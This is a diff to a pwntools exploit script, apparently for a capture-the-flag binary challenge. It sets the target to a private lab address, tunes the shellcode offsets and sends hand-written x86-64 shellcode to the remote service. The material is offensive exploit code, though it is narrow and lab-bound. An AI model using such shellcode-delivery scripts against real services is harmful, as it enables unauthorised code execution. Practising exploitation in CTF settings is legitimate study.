@@ -13,7 +13,7 @@ def conn():
         if args.DEBUG:
             gdb.attach(r)
     else:
-        r = remote("addr", 1337)
+        r = remote("192.168.100.3", 38201)
 
     return r
 
@@ -36,8 +36,8 @@ def main():
 
 
     base = 0xbeef0000
-    offset = 48
-    offset2 = 50
+    offset = 55
+    offset2 = offset + 2
     assembly = """
 		xor rax, rax  # 3
 		xor rsi, rsi 
@@ -57,7 +57,6 @@ def main():
 
     payload = asm(assembly.format( base + offset, base + offset2))
     a = bytes([syscall[0]-1, syscall[1]-1])
-    payload = payload 
     print('SIZE OF PAYLOAD: ' + str(len(payload)))
     print(b'payload: ' + payload)
     
@@ -67,7 +66,7 @@ def main():
     size = len(payload)
 
     print(r.recvline())
-    r.sendline(str(len(payload)).encode())
+    r.sendline(str(size).encode())
 
     print(r.recvline())
     r.sendline(payload)
